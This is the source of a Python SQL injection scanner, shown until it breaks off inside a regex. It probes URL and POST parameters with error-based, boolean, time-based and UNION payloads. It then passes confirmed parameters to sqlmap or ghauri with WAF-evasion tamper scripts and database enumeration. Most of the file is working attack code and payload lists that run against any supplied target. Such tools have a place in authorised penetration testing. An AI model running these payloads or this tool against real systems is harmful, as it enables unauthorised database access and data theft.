#!/usr/bin/env python3
"""
SQLi Hunter v3.0 — Checklist-Based SQL Injection Scanner
════════════════════════════════════════════════════════════
Every phase prints what it sent, what came back, and why it decided.
Nothing is silent. No "clean" without evidence.

Architecture
────────────
Phase 1 [Checklist]  Native Python — no external tools
  Per URL → Per param → 4 ordered phases, early-exit on first hit
    P1 Error-Based   SQL error signatures in response body
    P2 Boolean-Based TRUE vs FALSE response divergence
    P3 Time-Based    Proportional SLEEP confirmation
    P4 Union-Based   ORDER BY column count + UNION SELECT

Phase 2 [Auto]       sqlmap / ghauri — exploitation only
  Targets params confirmed by Phase 1 (or all with --auto-on-all)

Usage
─────
  python3 sqli_hunter.py -u urls.txt
  python3 sqli_hunter.py -U "https://target.com/page?id=1&cat=2"
  python3 sqli_hunter.py -u urls.txt --mode full --auto-level advanced
  python3 sqli_hunter.py -u urls.txt -x http://127.0.0.1:8080 -H "Auth: Bearer TOKEN"
  python3 sqli_hunter.py -U URL --method POST --data "id=1&name=test"
  python3 sqli_hunter.py -u urls.txt --mode checklist --param id,search --sleep 3
  python3 sqli_hunter.py -u urls.txt --mode auto --auto-level both --auto-on-all
"""

import sys, json, time, re, shutil, argparse, traceback, threading, subprocess
from pathlib import Path
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urlunparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    print("[!] Missing: pip install requests")
    sys.exit(1)

# ═══════════════════════════════════════════════════════════════════════
#  GLOBALS
# ═══════════════════════════════════════════════════════════════════════
_write_lock = threading.Lock()
_no_color   = False

R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"
C = "\033[96m"; B = "\033[1m";  DIM = "\033[2m"; W = "\033[97m"

def _c(code, text):
    return text if _no_color else f"{code}{text}\033[0m"

def ok(m):       print(_c(G,   f"  [+] {m}"),                   flush=True)
def info(m):     print(_c(C,   f"  [*] {m}"),                   flush=True)
def warn(m):     print(_c(Y,   f"  [!] {m}"),                   flush=True)
def err(m):      print(_c(R,   f"  [-] {m}"),                   flush=True)
def errhdr(m):   print(_c(R,   f"\n  [ERROR] {m}"),             flush=True)
def hdr(m):      print(_c(B,   f"\n{'═'*64}\n  {m}\n{'═'*64}"), flush=True)
def dim(m):      print(_c(DIM, f"  {m}"),                       flush=True)

def vuln_print(url, param, tech, payload, conf, waf):
    print(_c(B, _c(G, f"""
  ╔══════════════════════════════════════════════════════
  ║  VULNERABLE: {tech.upper()}
  ║  URL   : {url}
  ║  Param : {param}
  ║  Conf  : {conf}{'  [WAF detected]' if waf else ''}
  ║  Payload: {payload[:80]}
  ╚══════════════════════════════════════════════════════""")), flush=True)

def banner(mode, auto_level, threads):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(_c(C+B, f"""
╔══════════════════════════════════════════════════════════════╗
║  SQLi Hunter v3.2   [{ts}]
║  Mode: {mode:<12}  AutoLevel: {auto_level:<10}  Threads: {threads}
╚══════════════════════════════════════════════════════════════╝"""), flush=True)

# ═══════════════════════════════════════════════════════════════════════
#  CONFIG
# ═══════════════════════════════════════════════════════════════════════
@dataclass
class ScanConfig:
    urls:             list[str]     = field(default_factory=list)
    method:           str           = "GET"
    post_data:        str           = ""
    target_params:    list[str]     = field(default_factory=list)
    skip_params:      list[str]     = field(default_factory=list)
    extra_headers:    dict[str,str] = field(default_factory=dict)
    cookies:          dict[str,str] = field(default_factory=dict)
    proxy:            str           = ""
    user_agent:       str           = ("Mozilla/5.0 (X11; Linux x86_64) "
                                       "AppleWebKit/537.36 Chrome/120.0 Safari/537.36")
    follow_redirects: bool          = True
    verify_ssl:       bool          = False
    timeout:          int           = 15
    req_delay:        float         = 0.0
    sleep_sec:        int           = 5
    time_margin_ms:   int           = 1500
    test_headers:     bool          = False
    test_cookies:     bool          = False
    mode:             str           = "full"
    auto_level:       str           = "basic"
    auto_on_all:      bool          = False
    threads:          int           = 5
    auto_threads:     int           = 3
    auto_timeout:     int           = 300
    output_dir:       Path          = field(default_factory=lambda: Path("sqli_results"))
    verbose:          bool          = False

# ═══════════════════════════════════════════════════════════════════════
#  EVIDENCE
# ═══════════════════════════════════════════════════════════════════════
def _fresh_ev() -> dict:
    return {
        "runs":      [],
        "checklist": {"findings": [], "clean": [], "waf_flagged": []},
        "sqlmap":    {"findings": [], "failed_payloads": []},
        "ghauri":    {"findings": [], "failed_payloads": []},
    }

def _load_ev(path: Path) -> dict:
    fresh = _fresh_ev()
    if not path.exists():
        return fresh
    try:
        with open(path) as f:
            loaded = json.load(f)
        for key, dv in fresh.items():
            if key not in loaded:
                loaded[key] = dv
            elif isinstance(dv, dict):
                for sk, sv in dv.items():
                    if sk not in loaded[key]:
                        loaded[key][sk] = sv
        info("Existing evidence.json loaded — new results will be appended")
        return loaded
    except Exception as e:
        warn(f"evidence.json unreadable ({e}) — starting fresh")
        return fresh

EVIDENCE: dict = {}

# Tracks ONLY the current run — never includes historical data
# Used for summary/report so old runs don't bleed through
RUN_FINDINGS: dict = {}

def _init_run():
    global RUN_FINDINGS
    RUN_FINDINGS = {
        "checklist": {"findings": [], "clean": [], "waf_flagged": []},
        "sqlmap"   : {"findings": [], "failed_payloads": []},
        "ghauri"   : {"findings": [], "failed_payloads": []},
    }

def _save_ev(path: Path):
    with _write_lock:
        try:
            with open(path, "w") as f:
                json.dump(EVIDENCE, f, indent=2, ensure_ascii=False)
        except Exception as e:
            warn(f"Could not save evidence: {e}")

# ═══════════════════════════════════════════════════════════════════════
#  TOOL STATUS
# ═══════════════════════════════════════════════════════════════════════
TOOL_STATUS: dict[str, dict] = {}

def ts_set(key, state, detail=""):
    with _write_lock:
        TOOL_STATUS[key] = {"state": state, "detail": detail,
                             "ts": datetime.now().isoformat(timespec="seconds")}

def ts_done(key, n=0):
    with _write_lock:
        TOOL_STATUS.setdefault(key, {}).update(
            {"state": "DONE", "findings": n,
             "ts": datetime.now().isoformat(timespec="seconds")})

def ts_error(key, exc):
    tb = traceback.format_exc()
    d  = f"{type(exc).__name__}: {exc}\n{tb}"
    with _write_lock:
        TOOL_STATUS[key] = {"state": "ERROR", "detail": d,
                             "ts": datetime.now().isoformat(timespec="seconds")}
    errhdr(f"[{key}] crashed:")
    for ln in d.splitlines():
        err(f"    {ln}")

# ═══════════════════════════════════════════════════════════════════════
#  HTTP ENGINE
# ═══════════════════════════════════════════════════════════════════════
def _make_session(cfg: ScanConfig) -> requests.Session:
    s = requests.Session()
    s.headers.update({"User-Agent": cfg.user_agent})
    s.headers.update(cfg.extra_headers)
    s.cookies.update(cfg.cookies)
    if cfg.proxy:
        s.proxies = {"http": cfg.proxy, "https": cfg.proxy}
    s.verify = cfg.verify_ssl
    return s

def _req(session, method, url, data=None, timeout=15, follow=True) -> dict | None:
    try:
        if method == "POST":
            r = session.post(url, data=data, timeout=timeout, allow_redirects=follow)
        else:
            r = session.get(url, timeout=timeout, allow_redirects=follow)
        return {
            "status"    : r.status_code,
            "length"    : len(r.content),
            "text"      : r.text,
            "elapsed_ms": int(r.elapsed.total_seconds() * 1000),
            "timed_out" : False,
        }
    except requests.exceptions.Timeout:
        return {"status": -1, "length": 0, "text": "",
                "elapsed_ms": timeout * 1000 + 200, "timed_out": True}
    except Exception:
        return None

# ═══════════════════════════════════════════════════════════════════════
#  URL / PARAM HELPERS
# ═══════════════════════════════════════════════════════════════════════
def _extract_params(url: str, post_data: str = "") -> dict[str, str]:
    params: dict[str, str] = {}
    p = urlparse(url)
    if p.query:
        for k, v in parse_qs(p.query, keep_blank_values=True).items():
            params[k] = v[0] if v else ""
    if post_data:
        for part in post_data.split("&"):
            if "=" in part:
                k, _, v = part.partition("=")
                params[k] = v
    return params

def _inject_get(url: str, param: str, payload: str) -> str:
    parsed = urlparse(url)
    orig   = parse_qs(parsed.query, keep_blank_values=True)
    parts  = []
    for k, vals in orig.items():
        v = payload if k == param else (vals[0] if vals else "")
        parts.append(f"{k}={v}")
    if param not in orig:
        parts.append(f"{param}={payload}")
    return urlunparse(parsed._replace(query="&".join(parts)))

def _inject_post(post_data: str, param: str, payload: str) -> dict[str, str]:
    result: dict[str, str] = {}
    for part in post_data.split("&"):
        if "=" in part:
            k, _, v = part.partition("=")
            result[k] = payload if k == param else v
    if param not in result:
        result[param] = payload
    return result

def _send(session, url, param, payload, method, post_data, timeout, delay) -> dict | None:
    if delay > 0:
        time.sleep(delay)
    if method == "POST":
        return _req(session, "POST", url, data=_inject_post(post_data, param, payload),
                    timeout=timeout)
    return _req(session, "GET", _inject_get(url, param, payload), timeout=timeout)

def safe_name(s: str, lim: int = 55) -> str:
    return re.sub(r"[^\w]", "_", s)[:lim]

# ═══════════════════════════════════════════════════════════════════════
#  DETECTION SIGNATURES
# ═══════════════════════════════════════════════════════════════════════
SQL_ERRORS = re.compile(
    r"(you have an error in your sql syntax"
    r"|warning:\s*mysql_"
    r"|mysql_fetch_array\(\)|mysql_num_rows\(\)"
    r"|supplied argument is not a valid mysql"
    r"|unclosed quotation mark after"
    r"|incorrect syntax near"
    r"|SqlException|system\.data\.sqlclient"
    r"|microsoft ole db provider for sql server"
    r"|ora-\d{4,}|oracle\.jdbc|oracle error"
    r"|pg_query\(\)|pg_exec\(\)|pg_fetch"
    r"|ERROR:\s*syntax error at or near"
    r"|sqlite_|SQLITE_ERROR|sqlite3\."
    r"|near.*syntax error|syntax error.*near"
    r"|sql command not properly ended"
    r"|division by zero"
    r"|invalid column name"
    r"|DB Error:|SQL Error:|Query failed"
    r"|ODBC Microsoft Access|JET Database Engine"
    r"|dynamic sql error"
    r"|column.*does not exist"
    r"|unterminated string literal"
    r"|quoted string not properly terminated)",
    re.IGNORECASE,
)

WAF_SIGNS = re.compile(
    r"(access denied by.*waf"
    r"|request blocked by"
    r"|sql injection detected"
    r"|malicious request detected"
    r"|blocked by imperva|incapsula"
    r"|mod_security.*blocked|modsecurity"
    r"|web application firewall.*blocked"
    r"|your ip.*has been blocked"
    r"|attack detected)",
    re.IGNORECASE,
)

# ═══════════════════════════════════════════════════════════════════════
#  PAYLOAD FACTORIES
# ═══════════════════════════════════════════════════════════════════════
_ERR_PROBES = [
    "'",  '"',  "`",
    "'--",  "'-- -",  "'#",  "'/*",
    "1'",  "1\"",
    "') OR ('1'='1",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))--",
    "' AND 1=CONVERT(int,@@version)--",
    "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a)--",
    "1 AND 1=2 UNION SELECT 1,@@version,3--",
    "';SELECT 1--",
]

def _bool_payloads(val: str) -> dict[str, str]:
    numeric = bool(re.match(r"^\d+$", val.strip()))
    if numeric:
        return {
            "TRUE" : f"{val} AND 1=1",
            "FALSE": f"{val} AND 1=2",
            "OR"   : f"{val} OR 1=1",
            "TRUE2": f"{val} AND 2=2",
            "FALSE2":f"{val} AND 2=3",
        }
    return {
        "TRUE" : f"{val}' AND '1'='1",
        "FALSE": f"{val}' AND '1'='2",
        "OR"   : f"{val}' OR '1'='1",
        "TRUE2": f"{val}' AND 'a'='a",
        "FALSE2":f"{val}' AND 'a'='b",
    }

def _time_payloads(val: str, s: int) -> list[str]:
    numeric = bool(re.match(r"^\d+$", val.strip()))
    if numeric:
        return [
            f"{val} AND SLEEP({s})",
            f"{val} AND SLEEP({s})--",
            f"{val} AND pg_sleep({s})",
            f"(SELECT * FROM (SELECT(SLEEP({s})))a)",
            f"{val} AND BENCHMARK({s*2000000},MD5('a'))",
            f"{val} AND IF(1=1,SLEEP({s}),0)",
            f"{val}; WAITFOR DELAY '0:0:{s}'",
        ]
    return [
        f"{val}' AND SLEEP({s})--",
        f"{val}' AND SLEEP({s})-- -",
        f"{val}' AND pg_sleep({s})--",
        f"{val}'XOR(SELECT(0)FROM(SELECT(SLEEP({s})))a)XOR'",
        f"{val}' AND BENCHMARK({s*2000000},MD5('a'))--",
        f"{val}' AND IF(1=1,SLEEP({s}),0)--",
        f"{val}'; WAITFOR DELAY '0:0:{s}'--",
        f"{val}' OR SLEEP({s})--",
        f"{val}' AND (SELECT 1 FROM(SELECT(SLEEP({s})))a)='1",
    ]

def _swap_sleep(payload: str, new_s: int) -> str:
    p = re.sub(r'SLEEP\(\d+\)',     f'SLEEP({new_s})',     payload, flags=re.I)
    p = re.sub(r'pg_sleep\(\d+\)', f'pg_sleep({new_s})', p,       flags=re.I)
    p = re.sub(r'BENCHMARK\(\d+,', f'BENCHMARK({new_s*2000000},', p, flags=re.I)
    p = re.sub(r"DELAY '0:0:\d+'", f"DELAY '0:0:{new_s}'", p,    flags=re.I)
    return p

# ═══════════════════════════════════════════════════════════════════════
#  FINDING
# ═══════════════════════════════════════════════════════════════════════
@dataclass
class Finding:
    url:        str
    param:      str
    method:     str
    technique:  str
    payload:    str
    evidence:   dict
    confidence: str
    confirmed:  bool = True
    waf:        bool = False
    notes:      list = field(default_factory=list)

    def to_dict(self) -> dict:
        return {
            "url": self.url, "param": self.param, "method": self.method,
            "technique": self.technique, "payload": self.payload,
            "confidence": self.confidence, "confirmed": self.confirmed,
            "waf": self.waf, "evidence": self.evidence, "notes": self.notes,
        }

# ═══════════════════════════════════════════════════════════════════════
#  PHASE 1: CHECKLIST ENGINE
#  All print calls are inside the phase functions — full proof-of-work
# ═══════════════════════════════════════════════════════════════════════

# ── Helpers for print-aligned output ────────────────────────────────
_P = "  │"   # phase continuation line prefix

def _r_str(r: dict | None) -> str:
    """One-line response summary."""
    if r is None:
        return "NO_RESPONSE"
    if r.get("timed_out"):
        return f"TIMEOUT/{r['elapsed_ms']}ms"
    return f"{r['status']}/{r['length']}B/{r['elapsed_ms']}ms"

# ── Baseline ─────────────────────────────────────────────────────────
def _baseline(session, url, param, val, method, post_data, cfg) -> dict | None:
    samples = []
    for _ in range(2):
        r = _send(session, url, param, val, method, post_data, cfg.timeout, cfg.req_delay)
        if r and r["status"] > 0:
            samples.append(r)

    if not samples:
        return None

    avg_len  = sum(r["length"]     for r in samples) // len(samples)
    avg_time = sum(r["elapsed_ms"] for r in samples) // len(samples)
    bl = {
        "status"     : samples[0]["status"],
        "avg_len"    : avg_len,
        "avg_time_ms": avg_time,
        "len_band"   : max(60, int(avg_len * 0.06)),
    }

    # Always print baseline — this is proof the endpoint was reached
    status_col = G if bl["status"] == 200 else (Y if bl["status"] in (301,302,304) else R)
    status_tag = ""
    if bl["status"] in (401, 403):
        status_tag = _c(R, "  ← endpoint blocked (4xx baseline — scan may be unreliable)")
    elif bl["status"] >= 500:
        status_tag = _c(R, "  ← server error baseline")
    print(_c(DIM, f"  ┌─ [{param}]") +
          f"  baseline: " +
          _c(status_col, str(bl['status'])) +
          f" / {bl['avg_len']}B / {bl['avg_time_ms']}ms" +
          status_tag,
          flush=True)
    return bl

# ── WAF probe ────────────────────────────────────────────────────────
def _detect_waf(session, url, param, method, post_data, cfg) -> bool:
    r = _send(session, url, param, "1' UNION SELECT NULL,NULL,NULL-- -",
              method, post_data, cfg.timeout, cfg.req_delay)
    if not r or r["status"] < 0:
        return False
    return bool(r.get("text") and WAF_SIGNS.search(r["text"]))

# ── P1: Error-Based ──────────────────────────────────────────────────
def _p1_error(session, url, param, val, bl, method, post_data, cfg) -> Finding | None:
    t0    = time.time()
    hits  = []
    tried = 0

    for probe in _ERR_PROBES:
        r = _send(session, url, param, probe, method, post_data, cfg.timeout, cfg.req_delay)
        tried += 1
        if not r or r["status"] < 0:
            continue
        m = SQL_ERRORS.search(r.get("text", ""))
        if m:
            snippet = r["text"][max(0, m.start()-30): m.end()+120].strip()[:300]
            hits.append((probe, r, snippet, m.group(0)))

    elapsed = round(time.time() - t0, 1)

    if hits:
        probe, r, snippet, matched = hits[0]
        print(_c(G, f"{_P}  P1 Error-Based  [{tried} probes / {elapsed}s]  ← HIT"), flush=True)
        print(_c(G, f"{_P}     probe   : {probe}"), flush=True)
        print(_c(G, f"{_P}     response: {_r_str(r)}"), flush=True)
        print(_c(G, f"{_P}     matched : {matched}"), flush=True)
        print(_c(G, f"{_P}     snippet : {snippet[:120]}"), flush=True)
        return Finding(
            url=url, param=param, method=method,
            technique="error-based", payload=probe,
            evidence={
                "error_snippet"  : snippet,
                "matched_pattern": matched,
                "status"         : r["status"],
                "response_length": r["length"],
                "probes_tried"   : tried,
                "phase_time_s"   : elapsed,
            },
            confidence="high",
        )

    print(_c(DIM, f"{_P}  P1 Error-Based  [{tried} probes / {elapsed}s]  → clean"), flush=True)
    return None

# ── P2: Boolean-Based ────────────────────────────────────────────────
def _p2_boolean(session, url, param, val, bl, method, post_data, cfg) -> Finding | None:
    if not bl:
        return None

    t0   = time.time()
    bp   = _bool_payloads(val)
    band = bl["len_band"]
    base = bl["avg_len"]
    rs   = {}

    for cond, payload in bp.items():
        r = _send(session, url, param, payload, method, post_data, cfg.timeout, cfg.req_delay)
        rs[cond] = r

    elapsed = round(time.time() - t0, 1)

    rT  = rs.get("TRUE");  rF  = rs.get("FALSE")
    rO  = rs.get("OR");    rT2 = rs.get("TRUE2"); rF2 = rs.get("FALSE2")

    if not rT or not rF:
        print(_c(DIM, f"{_P}  P2 Boolean      [5 probes / {elapsed}s]  → no response"), flush=True)
        return None

    tl   = rT["length"]; fl  = rF["length"]
    orl  = rO["length"] if rO else 0
    t2l  = rT2["length"] if rT2 else tl
    f2l  = rF2["length"] if rF2 else fl
    tf_d = abs(tl - fl)
    or_d = abs(orl - base)

    # Print evidence table always — user can see the numbers
    print(_c(DIM,
          f"{_P}  P2 Boolean      [5 probes / {elapsed}s]  "
          f"base={base}B  TRUE={tl}B  FALSE={fl}B  OR={orl}B  "
          f"Δ(T-F)={tf_d}B  band={band}B"),
          flush=True)

    primary_hit   = tf_d   > band
    secondary_hit = or_d   > band * 2

    if not (primary_hit or secondary_hit):
        print(_c(DIM, f"{_P}     → clean (diff within noise band)"), flush=True)
        return None

    # Cross-validate with second pair — prevents dynamic-page false positives
    if rT2 and rF2:
        if abs(tl - t2l) > band * 3 or abs(fl - f2l) > band * 3:
            print(_c(Y, f"{_P}     → diff found but page is too dynamic (false positive filtered)"), flush=True)
            return None

    winner  = bp["OR"] if secondary_hit and not primary_hit else bp["TRUE"]
    conf    = "high" if (tf_d > band * 4 or or_d > band * 5) else "medium"

    print(_c(G, f"{_P}     → HIT!  Δ={tf_d}B  confidence={conf}"), flush=True)
    return Finding(
        url=url, param=param, method=method,
        technique="boolean-based", payload=winner,
        evidence={
            "baseline_len"   : base,
            "true_len"       : tl,
            "false_len"      : fl,
            "or_len"         : orl,
            "true_false_diff": tf_d,
            "or_diff"        : or_d,
            "threshold_band" : band,
            "payloads"       : bp,
            "phase_time_s"   : elapsed,
        },
        confidence=conf,
    )

# ── P3: Time-Based ───────────────────────────────────────────────────
def _p3_time(session, url, param, val, bl, method, post_data, cfg) -> Finding | None:
    if not bl:
        return None

    t0      = time.time()
    b_ms    = bl["avg_time_ms"]
    s       = cfg.sleep_sec
    margin  = cfg.time_margin_ms
    min_ms  = (s * 1000) - margin
    t_out   = cfg.timeout + s + 5
    payloads = _time_payloads(val, s)
    hit_payload = None
    hit_r       = None

    print(_c(DIM,
          f"{_P}  P3 Time-Based   [{len(payloads)} payloads / sleep={s}s / "
          f"threshold≥{min_ms}ms]"),
          flush=True)

    for payload in payloads:
        if cfg.req_delay > 0:
            time.sleep(cfg.req_delay)

        r = _send(session, url, param, payload, method, post_data, t_out, 0)
        if not r:
            print(_c(DIM, f"{_P}     {payload[:55]:<55}  → NO_RESPONSE"), flush=True)
            continue

        elapsed   = r["elapsed_ms"]
        timed_out = r.get("timed_out", False)
        marker    = ""

        if timed_out or elapsed >= min_ms:
            marker = _c(G, "  ← candidate")
            hit_payload = payload
            hit_r       = r

        print(_c(DIM if not marker else W,
              f"{_P}     {payload[:55]:<55}  → {_r_str(r)}{marker}"),
              flush=True)

        if hit_payload:
            break

    if not hit_payload:
        elapsed_total = round(time.time() - t0, 1)
        print(_c(DIM, f"{_P}     → clean  (no payload triggered ≥{min_ms}ms delay)  [{elapsed_total}s]"), flush=True)
        return None

    # ── Proportional confirmation ─────────────────────────────────────
    print(_c(Y, f"{_P}     Confirming with proportional sleeps..."), flush=True)
    short_s = max(1, s - 1)
    long_s  = s + 2
    confirms = []
    confirmed_count = 0

    for exp_s, cp in [(short_s, _swap_sleep(hit_payload, short_s)),
                      (long_s,  _swap_sleep(hit_payload, long_s))]:
        cr = _send(session, url, param, cp, method, post_data, t_out + 4, 0)
        if cr:
            exp_ms  = exp_s * 1000
            act_ms  = cr["elapsed_ms"]
            passed  = cr.get("timed_out") or abs(act_ms - exp_ms) < (margin + 1500)
            confirms.append({"sleep_sec": exp_s, "expected_ms": exp_ms,
                             "actual_ms": act_ms, "pass": passed})
            tag = _c(G, "PASS ✓") if passed else _c(R, "FAIL ✗")
            print(_c(DIM,
                  f"{_P}     sleep({exp_s}s) → expected≈{exp_ms}ms  got={act_ms}ms  {tag}"),
                  flush=True)
            if passed:
                confirmed_count += 1

    timed_out_initial = hit_r.get("timed_out", False)
    confirmed = confirmed_count >= 1 or timed_out_initial

    if not confirmed:
        print(_c(Y, f"{_P}     → proportional check failed — likely timing jitter, skipping"), flush=True)
        return None

    elapsed_total = round(time.time() - t0, 1)
    conf = "high" if confirmed_count == 2 else "medium"
    print(_c(G, f"{_P}     → CONFIRMED  confirmations={confirmed_count}/2  confidence={conf}  [{elapsed_total}s]"), flush=True)

    return Finding(
        url=url, param=param, method=method,
        technique="time-based", payload=hit_payload,
        evidence={
            "baseline_ms"      : b_ms,
            "candidate_ms"     : hit_r["elapsed_ms"],
            "timed_out"        : timed_out_initial,
            "sleep_sec"        : s,
            "min_threshold_ms" : min_ms,
            "confirmations"    : confirms,
            "phase_time_s"     : elapsed_total,
        },
        confidence=conf,
    )

# ── P4: Union-Based ──────────────────────────────────────────────────
def _p4_union(session, url, param, val, bl, method, post_data, cfg) -> Finding | None:
    if not bl:
        return None

    t0          = time.time()
    base_status = bl["status"]
    numeric     = bool(re.match(r"^\d+$", val.strip()))
    col_count   = None

    print(_c(DIM, f"{_P}  P4 Union-Based  [ORDER BY enumeration...]"), flush=True)

    # Step 1: ORDER BY column count
    for i in range(1, 26):
        probe = (f"{val} ORDER BY {i}-- -" if numeric
                 else f"{val}' ORDER BY {i}-- -")
        r = _send(session, url, param, probe, method, post_data, cfg.timeout, cfg.req_delay)
        if not r:
            continue
        has_err = bool(SQL_ERRORS.search(r.get("text", "")))
        status_changed = r["status"] != base_status and r["status"] not in (200, 301, 302)
        if has_err or status_changed:
            col_count = i - 1
            why = "SQL error" if has_err else f"status {r['status']}"
            print(_c(DIM,
                  f"{_P}     ORDER BY {i}  → {why}  ← column count = {col_count}"),
                  flush=True)
            break

    if not col_count:
        elapsed = round(time.time() - t0, 1)
        print(_c(DIM, f"{_P}     → clean  (couldn't determine column count)  [{elapsed}s]"), flush=True)
        return None

    # Step 2: UNION SELECT
    nums  = ",".join(str(n) for n in range(1, col_count + 1))
    nulls = ",".join(["NULL"] * col_count)
    probes = (
        [f"-1 UNION SELECT {nums}-- -",   f"0 UNION SELECT {nums}-- -",
         f"-1 UNION SELECT {nulls}-- -"]
        if numeric else
        [f"-1' UNION SELECT {nums}-- -",  f"0' UNION SELECT {nums}-- -",
         f"0 UNION SELECT {nums}-- -",    f"-1' UNION SELECT {nulls}-- -"]
    )

    for probe in probes:
        r = _send(session, url, param, probe, method, post_data, cfg.timeout, cfg.req_delay)
        if not r:
            continue
        text    = r.get("text", "")
        visible = [str(n) for n in range(1, col_count + 1)
                   if re.search(rf"(?<!\d){re.escape(str(n))}(?!\d)", text)]
        if len(visible) >= 1:
            elapsed = round(time.time() - t0, 1)
            print(_c(G, f"{_P}     → HIT!  probe={probe[:60]}  visible={visible}  [{elapsed}s]"), flush=True)
            return Finding(
                url=url, param=param, method=method,
                technique="union-based", payload=probe,
                evidence={
                    "column_count"   : col_count,
                    "visible_columns": visible,
                    "union_payload"  : probe,
                    "response_length": r["length"],
                    "phase_time_s"   : elapsed,
                },
                confidence="high",
            )

    elapsed = round(time.time() - t0, 1)
    print(_c(DIM, f"{_P}     → clean  (column count known={col_count} but UNION data not visible)  [{elapsed}s]"), flush=True)
    return None

# ── Per-param orchestrator ────────────────────────────────────────────
def _test_param(session, url, param, val, method, post_data, cfg) -> Finding | None:
    t_param = time.time()

    # Baseline — proof the endpoint responds
    bl = _baseline(session, url, param, val, method, post_data, cfg)
    if not bl:
        print(_c(R, f"  ┌─ [{param}]  UNREACHABLE — no response"), flush=True)
        return None

    # Warn on 4xx baseline
    if bl["status"] in (401, 403, 404, 405):
        print(_c(Y,
              f"{_P}  ⚠ Baseline is {bl['status']} — all injected requests "
              f"may look identical (scan continues but reliability reduced)"),
              flush=True)

    # WAF probe (doesn't block scan)
    waf = _detect_waf(session, url, param, method, post_data, cfg)
    if waf:
        print(_c(Y, f"{_P}  ⚠ WAF signature detected"), flush=True)

    # Run phases in order
    for phase_fn in (_p1_error, _p2_boolean, _p3_time, _p4_union):
        try:
            f = phase_fn(session, url, param, val, bl, method, post_data, cfg)
        except Exception as exc:
            errhdr(f"Phase exception [{param}]: {type(exc).__name__}: {exc}")
            if cfg.verbose:
                traceback.print_exc()
            continue

        if f:
            f.waf = waf
            total = round(time.time() - t_param, 1)
            print(_c(DIM, f"  └─ [{param}]  RESULT: VULNERABLE  [{total}s total]"), flush=True)
            return f

    total = round(time.time() - t_param, 1)
    print(_c(DIM, f"  └─ [{param}]  RESULT: clean  [{total}s total]"), flush=True)
    return None

# ── Full URL scan ─────────────────────────────────────────────────────
def _scan_url(url: str, cfg: ScanConfig) -> list[Finding]:
    session = _make_session(cfg)
    method  = cfg.method
    pd      = cfg.post_data

    # Extract params from URL query string and/or POST body
    all_params = _extract_params(url, pd if method == "POST" else "")

    if cfg.target_params:
        # Bug fix: when --param given explicitly, use those params directly.
        # If they're not in the URL/body (e.g. POST without --data), use "" as value.
        # _inject_post/_inject_get both handle empty values correctly.
        params = {p: all_params.get(p, "") for p in cfg.target_params}
    elif cfg.skip_params:
        params = {k: v for k, v in all_params.items() if k not in cfg.skip_params}
    else:
        params = all_params

    if not params:
        warn(f"No testable params in: {url}")
        warn(f"  Hint: if POST, add --data 'param1=val&param2=val'  OR  use --param name1,name2")
        return []

    print(_c(B, f"\n  ── {url}"), flush=True)
    print(_c(DIM, f"  Method: {method}  Params: [{', '.join(params.keys())}]"), flush=True)
    if method == "POST" and not pd and cfg.target_params:
        print(_c(Y, f"  ⚠ POST with no --data: injecting params into empty body"), flush=True)

    findings = []
    for param, val in params.items():
        print(flush=True)
        try:
            f = _test_param(session, url, param, val, method, pd, cfg)
            if f:
                vuln_print(url, param, f.technique, f.payload, f.confidence, f.waf)
                findings.append(f)
                d = f.to_dict()
                with _write_lock:
                    EVIDENCE["checklist"]["findings"].append(d)
                    RUN_FINDINGS["checklist"]["findings"].append(d)
                    if f.waf:
                        EVIDENCE["checklist"]["waf_flagged"].append({"url": url, "param": param})
                        RUN_FINDINGS["checklist"]["waf_flagged"].append({"url": url, "param": param})
                _save_ev(cfg.output_dir / "evidence.json")
            else:
                with _write_lock:
                    EVIDENCE["checklist"]["clean"].append({"url": url, "param": param})
                    RUN_FINDINGS["checklist"]["clean"].append({"url": url, "param": param})
        except Exception as exc:
            errhdr(f"Exception on param [{param}]  {url}")
            err(f"    {type(exc).__name__}: {exc}")
            if cfg.verbose:
                traceback.print_exc()

    return findings


def run_checklist(cfg: ScanConfig) -> list[Finding]:
    ts_set("checklist", "RUNNING")
    hdr("PHASE 1 — Checklist  [Error / Boolean / Time / Union]")
    all_findings: list[Finding] = []

    with ThreadPoolExecutor(max_workers=cfg.threads,
                            thread_name_prefix="check") as ex:
        futs = {ex.submit(_scan_url, url, cfg): url for url in cfg.urls}
        for fut in as_completed(futs):
            try:
                all_findings.extend(fut.result())
            except Exception as exc:
                errhdr(f"Worker fatal: {type(exc).__name__}: {exc}")

    ts_done("checklist", len(all_findings))
    ok(f"Checklist done — {len(all_findings)} vulnerable param(s)")
    return all_findings


# ═══════════════════════════════════════════════════════════════════════
#  PHASE 2: AUTO ENGINE
# ═══════════════════════════════════════════════════════════════════════
_SQLMAP_BASIC = [
    "--level=2", "--risk=2", "--technique=BEUSTQ",
    "--threads=5", "--time-sec=8", "--random-agent",
    "--batch", "--timeout=25", "--retries=2", "--disable-coloring",
]
_SQLMAP_ADV = [
    "--level=5", "--risk=3", "--technique=BEUSTQ",
    "--threads=10", "--time-sec=10", "--random-agent",
    "--batch", "--timeout=30", "--retries=3", "--disable-coloring",
    "--smart", "--hex", "--hpp", "--fingerprint",
    "--skip-waf", "--union-cols=1-25",
    "--tamper=space2comment,between,randomcase,charencode,"
              "chardoubleencode,greatest,ifnull2ifisnull",
    "--csrf-retries=3",
]
_GHAURI_BASIC = [
    "--level=2", "--technique=T", "--threads=5", "--time-sec=8",
    "--random-agent", "--batch", "--timeout=25", "--retries=2",
]
_GHAURI_ADV = [
    "--level=3", "--technique=BEST", "--threads=10", "--time-sec=10",
    "--random-agent", "--batch", "--timeout=30", "--retries=3",
    "--tamper=space2comment,between,randomcase",
    "--dbs", "--fingerprint", "--smart",
]
_TECH_MAP = {
    "error-based": "E", "boolean-based": "B",
    "time-based":  "T", "union-based":   "U",
}
_NOISE = {
    "sqlmap": re.compile(
        r"""(
            \[\*\]\s*(starting|ending|shutting)
          | \[INFO\]\s*(heuristic|fetching|reading|using|starting|ending|
                        target\s+url|testing\s+connection|got\s+a|parsing|
                        checking|resuming|cache|flushing|sqlmap\s+will|
